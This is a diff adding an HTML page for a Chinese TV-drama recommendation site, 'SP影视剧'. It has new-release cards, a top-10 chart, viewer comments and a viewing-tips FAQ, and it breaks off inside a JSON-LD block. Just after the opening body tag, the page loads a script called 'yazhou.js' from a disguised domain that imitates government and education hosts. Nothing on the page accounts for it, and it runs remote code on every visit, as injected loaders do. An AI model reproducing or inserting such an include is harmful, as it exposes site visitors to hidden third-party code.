@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>SP影视剧｜剧荒时的剧集片单与追剧指南 · spyingshiju-app</title>
+<meta name="description" content="SP影视剧（spyingshiju-app.github.io）整理国产剧、美剧、日韩剧的高分片单与新剧更新日历：每日上新剧集、悬疑都市古装科幻分类片单、TOP10热播榜、观众短评与追剧排雷指南，帮你三分钟内挑到今晚能看的那一部。">
+<meta name="keywords" content="SP影视剧,sp影视剧,影视剧推荐,高分剧集片单,新剧上线,追剧日历,悬疑剧推荐,都市剧推荐,古装剧,美剧推荐,日韩剧,剧集排行榜,剧荒看什么,spyingshiju-app">
+<meta name="author" content="SP影视剧编辑部">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#0b0d12">
+<link rel="canonical" href="https://spyingshiju-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="SP影视剧">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:title" content="SP影视剧｜剧荒时的剧集片单与追剧指南">
+<meta property="og:description" content="每天更新的剧集片单、分类榜单与排雷短评，挑剧不用再翻十几个App。">
+<meta property="og:url" content="https://spyingshiju-app.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="SP影视剧｜剧荒时的剧集片单与追剧指南">
+<meta name="twitter:description" content="今天更新了什么、哪部值得追完、哪部看到第几集就该停，这里都写清楚。">
+<style>
+:root{
+  --bg:#0b0d12;
+  --bg2:#11151d;
+  --card:#151a24;
+  --line:#242c3a;
+  --txt:#e9edf5;
+  --sub:#96a0b3;
+  --dim:#6c7688;
+  --gold:#ffb454;
+  --cyan:#6ee7ff;
+  --pink:#ff7a90;
+  --r:14px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  margin:0;
+  background:var(--bg);
+  color:var(--txt);
+  font:16px/1.75 "PingFang SC","Hiragino Sans GB","Microsoft YaHei","Noto Sans CJK SC",system-ui,-apple-system,sans-serif;
+  overflow-x:hidden;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul,ol{margin:0;padding:0;list-style:none}
+h1,h2,h3,h4{margin:0;font-weight:700;letter-spacing:.02em;line-height:1.25}
+p{margin:0}
+.wrap{width:min(1180px,92vw);margin:0 auto}
+.skip{position:absolute;left:-9999px}
+.skip:focus{left:12px;top:12px;background:var(--gold);color:#111;padding:8px 14px;border-radius:8px;z-index:99}
+
+/* 顶部条 */
+.topbar{
+  position:sticky;top:0;z-index:50;
+  background:rgba(11,13,18,.82);
+  backdrop-filter:saturate(160%) blur(14px);
+  -webkit-backdrop-filter:saturate(160%) blur(14px);
+  border-bottom:1px solid var(--line);
+}
+.bar{display:flex;align-items:center;gap:18px;height:62px}
+.logo{display:flex;align-items:center;gap:9px;font-size:19px;font-weight:800;letter-spacing:.06em;white-space:nowrap}
+.logo i{
+  width:9px;height:9px;border-radius:50%;background:var(--gold);
+  box-shadow:0 0 0 4px rgba(255,180,84,.16);
+  display:inline-block;
+}
+.logo em{font-style:normal;color:var(--gold)}
+.bar nav{margin-left:auto;display:flex;gap:22px;font-size:14.5px;color:var(--sub)}
+.bar nav a{position:relative;padding:4px 0;transition:color .2s}
+.bar nav a::after{
+  content:"";position:absolute;left:0;right:100%;bottom:0;height:2px;
+  background:linear-gradient(90deg,var(--gold),var(--cyan));transition:right .25s;
+}
+.bar nav a:hover{color:#fff}
+.bar nav a:hover::after{right:0}
+.host{
+  font:12px/1 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  color:var(--dim);border:1px solid var(--line);border-radius:999px;
+  padding:6px 11px;white-space:nowrap;
+}
+@media(max-width:900px){
+  .host{display:none}
+  .bar{gap:12px}
+  .bar nav{gap:14px;font-size:13.5px;overflow-x:auto;scrollbar-width:none}
+  .bar nav::-webkit-scrollbar{display:none}
+}
+
+/* 首屏 */
+.hero{
+  position:relative;padding:74px 0 60px;
+  background:
+    radial-gradient(900px 420px at 88% -8%,rgba(255,180,84,.14),transparent 62%),
+    radial-gradient(700px 380px at 6% 108%,rgba(110,231,255,.10),transparent 60%);
+}
+.hero-grid{display:grid;grid-template-columns:1.35fr .85fr;gap:46px;align-items:start}
+.kicker{
+  display:inline-flex;align-items:center;gap:8px;font-size:12.5px;color:var(--gold);
+  border:1px solid rgba(255,180,84,.34);border-radius:999px;padding:5px 13px;
+  background:rgba(255,180,84,.07);letter-spacing:.08em;
+}
+.kicker b{width:5px;height:5px;border-radius:50%;background:var(--gold);display:inline-block}
+.hero h1{
+  margin:22px 0 0;
+  font-size:clamp(34px,6.4vw,68px);
+  letter-spacing:-.01em;
+}
+.hero h1 span{color:var(--gold)}
+.hero h1 small{
+  display:block;font-size:clamp(14px,1.7vw,19px);font-weight:500;color:var(--sub);
+  letter-spacing:0;margin-top:14px;line-height:1.7;
+}
+.hero-desc{margin-top:22px;color:var(--sub);font-size:16.5px;max-width:56ch}
+.hero-desc strong{color:#fff;font-weight:600}
+.hero-cta{display:flex;flex-wrap:wrap;gap:12px;margin-top:30px}
+.btn{
+  display:inline-block;padding:12px 26px;border-radius:999px;font-size:15px;font-weight:600;
+  transition:transform .2s,box-shadow .2s,background .2s;
+}
+.btn-a{background:linear-gradient(120deg,var(--gold),#ff8f5e);color:#171303;box-shadow:0 8px 24px -10px rgba(255,180,84,.7)}
+.btn-b{border:1px solid var(--line);color:var(--txt);background:var(--bg2)}
+.btn:hover{transform:translateY(-2px)}
+.meta-line{
+  margin-top:26px;font:12.5px/1.9 ui-monospace,Menlo,Consolas,monospace;color:var(--dim);
+  border-left:2px solid var(--line);padding-left:14px;
+}
+.meta-line b{color:var(--cyan);font-weight:500}
+
+/* 右侧更新条 */
+.today{
+  background:var(--card);border:1px solid var(--line);border-radius:var(--r);
+  padding:20px 20px 8px;position:relative;overflow:hidden;
+}
+.today::before{
+  content:"";position:absolute;left:0;right:0;top:0;height:3px;
+  background:repeating-linear-gradient(90deg,var(--gold) 0 10px,transparent 10px 20px);
+  opacity:.55;
+}
+.today h3{font-size:15px;display:flex;justify-content:space-between;align-items:center}
+.today h3 em{font-style:normal;font-size:12px;color:var(--dim);font-weight:400}
+.today li{
+  display:flex;gap:12px;padding:13px 0;border-bottom:1px dashed var(--line);
+}
+.today li:last-child{border-bottom:0}
+.today time{
+  flex:0 0 46px;font:12px/1.5 ui-monospace,Menlo,Consolas,monospace;color:var(--cyan);
+}
+.today p{font-size:14.5px}
+.today p b{display:block;font-weight:600;font-size:15px}
+.today p span{color:var(--dim);font-size:12.5px}
+@media(max-width:880px){
+  .hero{padding:46px 0 40px}
+  .hero-grid{grid-template-columns:1fr;gap:30px}
+}
+
+/* 通用区块 */
+section{padding:60px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:30px}
+.sec-head h2{font-size:clamp(22px,3.4vw,32px)}
+.sec-head h2 em{font-style:normal;color:var(--gold)}
+.sec-head p{color:var(--dim);font-size:13.5px;max-width:42ch}
+.tag-no{
+  font:12px/1 ui-monospace,Menlo,monospace;color:var(--gold);
+  border:1px solid rgba(255,180,84,.3);border-radius:6px;padding:5px 9px;
+}
+
+/* 胶片带 */
+.film{
+  position:relative;padding:16px 0;
+  background:var(--bg2);border-top:1px solid var(--line);border-bottom:1px solid var(--line);
+}
+.film::before,.film::after{
+  content:"";position:absolute;left:0;right:0;height:10px;
+  background-image:radial-gradient(circle at 8px 5px,var(--line) 2.2px,transparent 2.6px);
+  background-size:18px 10px;
+}
+.film::before{top:0}
+.film::after{bottom:0;transform:scaleY(-1)}
+.reel{
+  display:flex;gap:16px;overflow-x:auto;scroll-snap-type:x mandatory;
+  padding:14px 4vw 18px;scrollbar-width:thin;
+}
+.reel::-webkit-scrollbar{height:7px}
+.reel::-webkit-scrollbar-thumb{background:var(--line);border-radius:9px}
+.reel::-webkit-scrollbar-track{background:transparent}
+.poster{flex:0 0 232px;scroll-snap-align:start}
+.cover{
+  position:relative;height:300px;border-radius:12px;overflow:hidden;
+  border:1px solid var(--line);
+  display:flex;align-items:flex-end;padding:16px;
+}
+.cover::after{
+  content:"";position:absolute;inset:0;
+  background:linear-gradient(180deg,transparent 38%,rgba(6,8,12,.92));
+}
+.cover h4{position:relative;z-index:2;font-size:19px;line-height:1.35}
+.cover .badge{
+  position:absolute;z-index:2;top:12px;left:12px;font-size:11.5px;
+  background:rgba(8,10,15,.72);border:1px solid rgba(255,255,255,.14);
+  border-radius:6px;padding:3px 8px;color:#fff;
+}
+.cover .ep{
+  position:absolute;z-index:2;top:12px;right:12px;font-size:11.5px;color:#171303;
+  background:var(--gold);border-radius:6px;padding:3px 8px;font-weight:700;
+}
+.c1{background:linear-gradient(150deg,#2b3a55,#0f1724 70%)}
+.c2{background:linear-gradient(150deg,#4a2f3a,#150f16 70%)}
+.c3{background:linear-gradient(150deg,#2f4a41,#0f1a17 70%)}
+.c4{background:linear-gradient(150deg,#4a4130,#1a1610 70%)}
+.c5{background:linear-gradient(150deg,#3a2f4a,#150f1a 70%)}
+.c6{background:linear-gradient(150deg:#264a4a,#0f1a1a 70%)}
+.poster p{color:var(--sub);font-size:13.5px;margin-top:10px;line-height:1.65}
+.poster .rate{color:var(--gold);font-weight:700;font-size:14px}
+
+/* 分类 + 榜单 非对称 */
+.split{display:grid;grid-template-columns:.92fr 1.08fr;gap:32px;align-items:start}
+@media(max-width:920px){.split{grid-template-columns:1fr}}
+.chips{display:flex;flex-wrap:wrap;gap:9px;margin-bottom:22px}
+.chips a{
+  font-size:13.5px;color:var(--sub);border:1px solid var(--line);
+  border-radius:999px;padding:7px 15px;background:var(--bg2);transition:.2s;
+}
+.chips a:hover{color:#fff;border-color:var(--gold);background:rgba(255,180,84,.09)}
+.chips a.on{color:#171303;background:var(--gold);border-color:var(--gold);font-weight:600}
+.catlist li{
+  border-top:1px solid var(--line);padding:15px 0;display:grid;
+  grid-template-columns:78px 1fr auto;gap:14px;align-items:center;
+}
+.catlist li:last-child{border-bottom:1px solid var(--line)}
+.catlist .k{font-size:13px;color:var(--gold);letter-spacing:.04em}
+.catlist .n{font-size:16px;font-weight:600}
+.catlist .n span{display:block;font-weight:400;font-size:13px;color:var(--dim);margin-top:3px}
+.catlist .c{font-size:12.5px;color:var(--dim);white-space:nowrap}
+@media(max-width:520px){
+  .catlist li{grid-template-columns:64px 1fr;gap:10px}
+  .catlist .c{grid-column:2;font-size:12px}
+}
+
+/* 榜单 */
+.rank{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:8px 8px 4px}
+.rank li{
+  display:grid;grid-template-columns:52px 1fr 78px;gap:14px;align-items:center;
+  padding:14px 12px;border-radius:10px;transition:background .2s;
+}
+.rank li:hover{background:rgba(255,255,255,.035)}
+.rank .no{
+  font:700 24px/1 ui-monospace,Menlo,monospace;
+  color:var(--line);letter-spacing:-.02em;
+}
+.rank li:nth-child(1) .no{color:var(--gold)}
+.rank li:nth-child(2) .no{color:#d7dce6}
+.rank li:nth-child(3) .no{color:#c58a5c}
+.rank .t{font-size:15.5px;font-weight:600}
+.rank .t span{display:block;font-weight:400;font-size:12.5px;color:var(--dim);margin-top:2px}
+.rank .s{text-align:right}
+.rank .s b{color:var(--gold);font-size:16px}
+.rank .s i{
+  display:block;height:4px;border-radius:4px;margin-top:6px;
+  background:var(--line);overflow:hidden;font-style:normal;
+}
+.rank .s i em{display:block;height:100%;background:linear-gradient(90deg,var(--gold),var(--pink));font-style:normal}
+
+/* 短评 */
+.quotes{columns:3;column-gap:18px}
+@media(max-width:960px){.quotes{columns:2}}
+@media(max-width:620px){.quotes{columns:1}}
+.quote{
+  break-inside:avoid;margin-bottom:18px;background:var(--card);
+  border:1px solid var(--line);border-left:3px solid var(--gold);
+  border-radius:10px;padding:18px 18px 16px;
+}
+.quote p{font-size:14.5px;color:#dbe1ec;line-height:1.8}
+.quote footer{margin-top:12px;font-size:12.5px;color:var(--dim);display:flex;justify-content:space-between;gap:10px}
+.quote footer b{color:var(--cyan);font-weight:500}
+
+/* 指南 */
+.faq{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+@media(max-width:820px){.faq{grid-template-columns:1fr}}
+.faq details{
+  background:var(--bg2);border:1px solid var(--line);border-radius:12px;
+  padding:0 18px;transition:border-color .2s;
+}
+.faq details[open]{border-color:rgba(255,180,84,.4)}
+.faq summary{
+  cursor:pointer;list-style:none;padding:17px 0;font-size:15.5px;font-weight:600;
+  display:flex;align-items:center;justify-content:space-between;gap:12px;
+}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"+";color:var(--gold);font-size:19px;line-height:1}
+.faq details[open] summary::after{content:"–"}
+.faq p{color:var(--sub);font-size:14.5px;padding:0 0 18px;line-height:1.85}
+
+/* 关于卡 */
+.about{
+  display:grid;grid-template-columns:1.1fr .9fr;gap:0;
+  border:1px solid var(--line);border-radius:16px;overflow:hidden;background:var(--card);
+}
+@media(max-width:880px){.about{grid-template-columns:1fr}}
+.about-l{padding:34px 32px}
+.about-l h2{font-size:24px;margin-bottom:14px}
+.about-l p{color:var(--sub);font-size:15px;line-height:1.9}
+.about-l p+p{margin-top:12px}
+.about-r{
+  padding:34px 32px;background:var(--bg2);border-left:1px solid var(--line);
+  display:flex;flex-direction:column;gap:14px;
+}
+@media(max-width:880px){.about-r{border-left:0;border-top:1px solid var(--line)}}
+.kv{display:flex;justify-content:space-between;gap:14px;font-size:14px;border-bottom:1px dashed var(--line);padding-bottom:11px}
+.kv:last-of-type{border-bottom:0}
+.kv span{color:var(--dim)}
+.kv b{font-weight:600;word-break:break-all;text-align:right}
+.kv b.url{color:var(--cyan);font:13.5px/1.6 ui-monospace,Menlo,Consolas,monospace;font-weight:500}
+.join{
+  margin-top:6px;display:flex;gap:8px;
+}
+.join input{
+  flex:1;min-width:0;background:var(--bg);border:1px solid var(--line);border-radius:10px;
+  padding:11px 13px;color:var(--txt);font-size:14px;outline:none;
+}
+.join input:focus{border-color:var(--gold)}
+.join button{
+  border:0;border-radius:10px;padding:0 18px;background:var(--gold);color:#171303;
+  font-weight:700;font-size:14px;cursor:pointer;
+}
+
+/* 页脚 */
+footer{border-top:1px solid var(--line);background:#080a0f;padding:46px 0 34px;margin-top:20px}
+.foot-url{
+  font:clamp(15px,2.4vw,22px)/1.4 ui-monospace,Menlo,Consolas,monospace;
+  color:var(--gold);word-break:break-all;padding-bottom:22px;margin-bottom:28px;
+  border-bottom:1px solid var(--line);
+}
+.foot-url span{display:block;font:12px/1.8 system-ui,sans-serif;color:var(--dim);margin-top:8px}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:26px}
+@media(max-width:820px){.foot-grid{grid-template-columns:1fr 1fr}}
+@media(max-width:480px){.foot-grid{grid-template-columns:1fr}}
+.foot-grid h4{font-size:14px;margin-bottom:12px;color:#fff}
+.foot-grid li{font-size:13.5px;color:var(--dim);padding:5px 0}
+.foot-grid li:hover{color:var(--sub)}
+.copy{
+  margin-top:32px;padding-top:20px;border-top:1px solid var(--line);
+  font-size:12.5px;color:var(--dim);display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;
+}
+.reveal{opacity:0;transform:translateY(18px);transition:opacity .6s ease,transform .6s ease}
+.reveal.in{opacity:1;transform:none}
+@media(prefers-reduced-motion:reduce){.reveal{opacity:1;transform:none;transition:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+<a class="skip" href="#main">跳到主要内容</a>
+
+<header class="topbar">
+  <div class="wrap bar">
+    <a class="logo" href="#"><i></i>SP<em>影视剧</em></a>
+    <nav aria-label="主导航">
+      <a href="#new">新剧上线</a>
+      <a href="#cat">分类片单</a>
+      <a href="#rank">热播榜</a>
+      <a href="#words">观众短评</a>
+      <a href="#guide">追剧指南</a>
+      <a href="#about">关于</a>
+    </nav>
+    <span class="host">spyingshiju-app.github.io</span>
+  </div>
+</header>
+
+<main id="main">
+
+  <!-- 首屏 -->
+  <div class="hero">
+    <div class="wrap hero-grid">
+      <div>
+        <span class="kicker"><b></b>每日 09:00 与 21:00 两次更新</span>
+        <h1>剧荒的时候，<span>SP影视剧</span>先给你一份能看的片单<small>不写长篇影评，只回答三件事：今天更新了什么、哪部值得追完、哪部第几集就该停。</small></h1>
+        <p class="hero-desc">我们把散落在各个平台的上新信息、评分变动和观众反馈收在一页里。国产剧、美剧、日韩剧分开排，<strong>不再为了找一部剧翻五六个 App</strong>。更新日期 2026 年 10 月 24 日。</p>
+        <div class="hero-cta">
+          <a class="btn btn-a" href="#new">看今天上新</a>
+          <a class="btn btn-b" href="#rank">直接翻榜单</a>
+        </div>
+        <p class="meta-line">站点名称：SP影视剧<br>站点地址：<b>https://spyingshiju-app.github.io</b><br>收录片单：<b>1260</b> 部 · 近 30 天更新 <b>318</b> 条</p>
+      </div>
+      <aside class="today" aria-label="今日更新">
+        <h3>今日更新 <em>10/24</em></h3>
+        <ul>
+          <li><time>09:10</time><p><b>悬疑 · 《沉默的证词》</b><span>更新至第 6 集 / 共 16 集</span></p></li>
+          <li><time>11:35</time><p><b>都市 · 《三十七度二》</b><span>更新至第 12 集 / 共 24 集</span></p></li>
+          <li><time>15:02</time><p><b>古装 · 《长风渡·续》</b><span>更新至第 3 集 / 共 30 集</span></p></li>
+          <li><time>19:20</time><p><b>科幻 · 《深空信标》</b><span>更新至第 8 集 / 共 12 集</span></p></li>
+          <li><time>21:05</time><p><b>纪实 · 《县城医生》</b><span>第 4 期上线</span></p></li>
+        </ul>
+      </aside>
+    </div>
+  </div>
+
+  <!-- 新剧上线：胶片带 -->
+  <section id="new" style="padding-bottom:0">
+    <div class="wrap sec-head">
+      <div>
+        <h2>本周<em>新剧上线</em></h2>
+        <p>横向拖动查看，卡片右下角是当前更新进度，评分来自站内观众打分（10 分制）。</p>
+      </div>
+      <span class="tag-no">栏目 01 / NEW</span>
+    </div>
+  </section>
+  <div class="film">
+    <ul class="reel" tabindex="0" aria-label="新剧上线列表">
+      <li class="poster">
+        <div class="cover c1"><span class="badge">国产 · 悬疑</span><span class="ep">更新至 06</span><h4>沉默的证词</h4></div>
+        <p><span class="rate">8.9</span> · 16 集 · 2026｜一场旧案复查牵出三个家庭的沉默，节奏偏慢，第 4 集开始收紧。</p>
+      </li>
+      <li class="poster">
+        <div class="cover c2"><span class="badge">国产 · 都市</span><span class="ep">更新至 12</span><h4>三十七度二</h4></div>
+        <p><span class="rate">8.1</span> · 24 集 · 2026｜急诊科与婚姻两条线并行，台词不悬浮，适合一口气追。</p>
+      </li>
+      <li class="poster">
+        <div class="cover c3"><span class="badge">国产 · 家庭</span><span class="ep">更新至 09</span><h4>小院春秋</h4></div>
+        <p><span class="rate">8.4</span> · 32 集 · 2026｜三代人挤在一座老院子，笑点是真的，鸡毛也是真的。</p>
+      </li>
+      <li class="poster">
+        <div class="cover c4"><span class="badge">国产 · 古装</span><span class="ep">更新至 03</span><h4>长风渡·续</h4></div>
+        <p><span class="rate">7.6</span> · 30 集 · 2026｜前作班底回归，服化道在线，剧情目前还在铺。</p>
+      </li>
+      <li class="poster">
+        <div class="cover c5"><span class="badge">美剧 · 科幻</span><span class="ep">更新至 08</span><h4>深空信标</h4></div>
+        <p><span class="rate">9.0</span> · 12 集 · 2026｜硬科幻外壳下是伦理追问，建议不看剧透直接从第 1 集进。</p>
+      </li>
+      <li class="poster">
+        <div class="cover c6"><span class="badge">韩剧 · 职场</span><span class="ep">已完结</span><h4>第九会议室</h4></div>
+        <p><span class="rate">8.7</span> · 16 集 · 2026｜会议室里的权力戏，台词密度高，字幕要跟紧。</p>
+      </li>
+    </ul>
+  </div>
+
+  <!-- 分类 + 榜单 -->
+  <section id="cat">
+    <div class="wrap split">
+      <div class="reveal">
+        <div class="sec-head" style="margin-bottom:18px">
+          <div><h2>按口味<em>分好类</em></h2><p>点标签看对应片单，每类挑出 6 部不踩雷的。</p></div>
+        </div>
+        <div class="chips">
+          <a class="on" href="#">悬疑</a>
+          <a href="#">都市</a>
+          <a href="#">古装</a>
+          <a href="#">科幻</a>
+          <a href="#">家庭</a>
+          <a href="#">纪实</a>
+          <a href="#">日韩</a>
+          <a href="#">欧美</a>
+        </div>
+        <ul class="catlist">
+          <li><span class="k">悬疑</span><span class="n">隐秘的角落<span>三个孩子在暑假里拍下了一段不该拍的画面</span></span><span class="c">12 集 · 9.0</span></li>
+          <li><span class="k">悬疑</span><span class="n">漫长的季节<span>东北小城，一列火车拉走了二十年的事</span></span><span class="c">12 集 · 9.4</span></li>
+          <li><span class="k">都市</span><span class="n">去有风的地方<span>慢下来这件事，需要有人先示范</span></span><span class="c">40 集 · 8.4</span></li>
+          <li><span class="k">古装</span><span class="n">庆余年 第二季<span>权谋与笑话掺着来，看得很轻松</span></span><span class="c">36 集 · 7.3</span></li>
+          <li><span class="k">科幻</span><span class="n">三体<span>把"不要回答"四个字拍出了重量</span></span><span class="c">30 集 · 8.7</span></li>
+          <li><span class="k">家庭</span><span class="n">山海情<span>从黄土坡到新家园，人物都立得住</span></span><span class="c">23 集 · 9.2</span></li>
+        </ul>
+      </div>
+      <div class="reveal" id="rank">
+        <div class="sec-head" style="margin-bottom:18px">
+          <div><h2>近 7 天<em>热播榜</em></h2><p>按站内点击与完播率综合排序，每天 21:00 重算。</p></div>
+          <span class="tag-no">TOP 10</span>
+        </div>
+        <ol class="rank">
+          <li><span class="no">01</span><span class="t">沉默的证词<span>悬疑 · 更新至第 6 集</span></span><span class="s"><b>8.9</b><i><em style="width:89%"></em></i></span></li>
+          <li><span class="no">02</span><span class="t">深空信标<span>科幻 · 更新至第 8 集</span></span><span class="s"><b>9.0</b><i><em style="width:90%"></em></i></span></li>
+          <li><span class="no">03</span><span class="t">三十七度二<span>都市 · 更新至第 12 集</span></span><span class="s"><b>8.1</b><i><em style="width:81%"></em></i></span></li>
+          <li><span class="no">04</span><span class="t">小院春秋<span>家庭 · 更新至第 9 集</span></span><span class="s"><b>8.4</b><i><em style="width:84%"></em></i></span></li>
+          <li><span class="no">05</span><span class="t">第九会议室<span>韩剧 · 已完结</span></span><span class="s"><b>8.7</b><i><em style="width:87%"></em></i></span></li>
+          <li><span class="no">06</span><span class="t">长风渡·续<span>古装 · 更新至第 3 集</span></span><span class="s"><b>7.6</b><i><em style="width:76%"></em></i></span></li>
+          <li><span class="no">07</span><span class="t">县城医生<span>纪实 · 第 4 期</span></span><span class="s"><b>8.8</b><i><em style="width:88%"></em></i></span></li>
+          <li><span class="no">08</span><span class="t">狂飙<span>涉案 · 39 集完结</span></span><span class="s"><b>8.5</b><i><em style="width:85%"></em></i></span></li>
+          <li><span class="no">09</span><span class="t">我的阿勒泰<span>短剧 · 8 集完结</span></span><span class="s"><b>8.8</b><i><em style="width:88%"></em></i></span></li>
+          <li><span class="no">10</span><span class="t">觉醒年代<span>历史 · 43 集完结</span></span><span class="s"><b>9.3</b><i><em style="width:93%"></em></i></span></li>
+        </ol>
+      </div>
+    </div>
+  </section>
+
+  <!-- 短评 -->
+  <section id="words" style="padding-top:0">
+    <div class="wrap">
+      <div class="sec-head">
+        <div><h2>观众<em>短评</em></h2><p>来自站内投稿，只留一句最有信息量的，长篇测评另开栏目。</p></div>
+        <span class="tag-no">栏目 04 / WORDS</span>
+      </div>
+      <div class="quotes">
+        <blockquote class="quote">
+          <p>前两集差点弃，第三集那场饭桌戏一出来就知道这部稳了，后面每集都有钩子。</p>
+          <footer><b>@阿槐</b><span>《沉默的证词》· 10/23</span></footer>
+        </blockquote>
+        <blockquote class="quote">
+          <p>别被"硬科幻"吓到，人物关系写得比设定好，第 6 集那段独白值得反复看。</p>
+          <footer><b>@Norah</b><span>《深空信标》· 10/22</span></footer>
+        </blockquote>
+        <blockquote class="quote">
+          <p>难得有都市剧让女主的职业线真正推动剧情，而不是谈恋爱顺便上班。</p>
+          <footer><b>@小满</b><span>《三十七度二》· 10/21</span></footer>
+        </blockquote>
+        <blockquote class="quote">
+          <p>八集刚好，多一集都会腻。看完想去一趟阿勒泰，这就是它厉害的地方。</p>
+          <footer><b>@老王不加班</b><span>《我的阿勒泰》· 10/20</span></footer>
+        </blockquote>
+        <blockquote class="quote">
+          <p>每集二十分钟的会议戏能拍出紧张感，字幕组辛苦了，建议别倍速。</p>
+          <footer><b>@HEE</b><span>《第九会议室》· 10/19</span></footer>
+        </blockquote>
+        <blockquote class="quote">
+          <p>老人那条线我能看一百集，年轻演员的部分稍微有点用力。</p>
+          <footer><b>@院里的猫</b><span>《小院春秋》· 10/18</span></footer>
+        </blockquote>
+      </div>
+    </div>
+  </section>
+
+  <!-- 指南 -->
+  <section id="guide" style="padding-top:0">
+    <div class="wrap">
+      <div class="sec-head">
+        <div><h2>追剧<em>排雷指南</em></h2><p>挑剧前先扫一眼这六条，能省掉不少时间。</p></div>
+        <span class="tag-no">栏目 05 / GUIDE</span>
+      </div>
+      <div class="faq">
+        <details open>
+          <summary>一部剧看到第几集还没起色，就可以停了？</summary>
+          <p>我们的经验是三集：第一集交代人物，第二集埋冲突，第三集如果还没出现"必须知道后续"的那个问题，大概率后面也是拖。纪实类和慢节奏文艺剧除外，这类可以放宽到四到五集。</p>
+        </details>
+        <details>
+          <summary>评分高但就是看不进去，怎么办？</summary>
+          <p>正常。评分反映的是群体感受，不是你的口味。可以先看我们的分类片单里"一句话推荐"那行，比对一下它打动人的点和你在不在同一个频道上，比盯着分数有用。</p>
+        </details>
+        <details>
+          <summary>倍速看剧算不算浪费一部好剧？</summary>
+          <p>看类型。台词密度高的职场、悬疑剧不建议倍速，信息丢失会直接影响理解；家庭、古装长剧的过渡段落用 1.25 倍问题不大。真正该做的是跳过注水集，而不是全程快进。</p>
+        </details>
+        <details>
+          <summary>怎么判断一部剧是不是"烂尾"？</summary>
+          <p>看倒数第三集。绝大多数烂尾发生在结局前一两集的收线阶段：新角色突然登场、旧矛盾被强行和解、主角做出与前面性格相反的决定，出现任意两条基本可以预判。</p>
+        </details>
+        <details>
+          <summary>短剧和长剧该怎么分配时间？</summary>
+          <p>8 到 12 集的短剧适合一晚上解决，观感完整；30 集以上的长剧建议按周追，跟更新节奏走，攒着看的完播率明显更低。我们的更新日历就是按这个逻辑排的。</p>
+        </details>
+        <details>
+          <summary>片单里的剧在哪里能看？</summary>
+          <p>SP影视剧只做信息整理与片单推荐，不提供播放源与下载。每部剧的播出平台请以官方公告为准，本站页面内不放置任何第三方播放链接。</p>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about" style="padding-top:10px">
+    <div class="wrap">
+      <div class="about">
+        <div class="about-l">
+          <h2>关于 SP影视剧</h2>
+          <p>2024 年从一个豆瓣豆列起步，后来变成几个人轮流值班的更新站。我们不做搬运式的新闻稿，每天只保留真正会影响"今晚看什么"的信息：上新、完结、评分明显变动、以及一条说得清理由的排雷提示。</p>
+          <p>片单每周重排一次，去掉已经过气的，补上新开播的。如果你发现某部剧的集数或评分和实际对不上，可以通过右侧订阅框回信告诉我们，我们会在当天更正。</p>
+        </div>
+        <div class="about-r">
+          <div class="kv"><span>站点名称</span><b>SP影视剧</b></div>
+          <div class="kv"><span>站点地址</span><b class="url">https://spyingshiju-app.github.io</b></div>
+          <div class="kv"><span>更新频率</span><b>每日 2 次</b></div>
+          <div class="kv"><span>收录剧集</span><b>1260 部</b></div>
+          <div class="kv"><span>内容范围</span><b>片单 · 榜单 · 短评</b></div>
+          <form class="join" action="#" method="get" onsubmit="return false;">
+            <label for="mail" style="position:absolute;left:-9999px">邮箱</label>
+            <input id="mail" type="email" name="email" placeholder="留下邮箱，收每周片单">
+            <button type="submit">订阅</button>
+          </form>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-url">
+      https://spyingshiju-app.github.io
+      <span>SP影视剧 · 剧集片单与追剧指南 · 站点唯一地址如上，其余同名站点与本站无关</span>
+    </div>
+    <div class="foot-grid">
+      <div>
+        <h4>SP影视剧</h4>
+        <p style="color:var(--dim);font-size:13.5px;line-height:1.85">每天更新的剧集片单与排雷提示，只做信息整理，不提供任何播放源。</p>
+      </div>
+      <div>
+        <h4>片单</h4>
+        <ul>
+          <li><a href="#">悬疑剧片单</a></li>
+          <li><a href="#">都市剧片单</a></li>
+          <li><a href="#">古装剧片单</a></li>
+          <li><a href="#">科幻剧片单</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>栏目</h4>
+        <ul>
+          <li><a href="#new">新剧上线</a></li>
+          <li><a href="#rank">热播榜单</a></li>
+          <li><a href="#words">观众短评</a></li>
+          <li><a href="#guide">追剧指南</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>站点</h4>
+        <ul>
+          <li><a href="#about">关于我们</a></li>
+          <li><a href="#">投稿与纠错</a></li>
+          <li><a href="#">内容说明</a></li>
+          <li><a href="#">联系方式</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© 2026 SP影视剧 · spyingshiju-app.github.io</span>
+      <span>最近更新：2026-10-24 21:05</span>
+    </div>
+  </div>
+</footer>
+
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@graph":[
+    {
+      "@type":"WebSite",
+      "@id":"https://spyingshiju-app.github.io/#website",
+      "url":"https://spyingshiju-app.github.io/",
+      "name":"SP影视剧",
+      "alternateName":"sp影视剧",
+      "inLanguage":"zh-CN",
